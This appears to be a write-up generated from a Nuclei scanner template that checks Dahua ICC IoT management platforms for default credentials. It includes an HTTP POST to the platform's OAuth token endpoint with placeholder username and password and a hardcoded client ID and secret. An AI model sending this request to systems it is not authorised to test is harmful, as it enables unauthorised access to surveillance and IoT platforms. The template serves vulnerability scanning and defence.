# Nuclei Template: Dahua ICC Default Login
**Template ID:** dahua-icc-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`dahua-icc-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Dahua ICC Intelligent IoT Integrated Management Platform contains default credentials. An attacker can authenticate to the platform using known default username and password combinations and obtain a valid access token.

## Steps to reproduce / Exploit Payload
```http
POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
```

## References
- https://www.dahuasecurity.com/
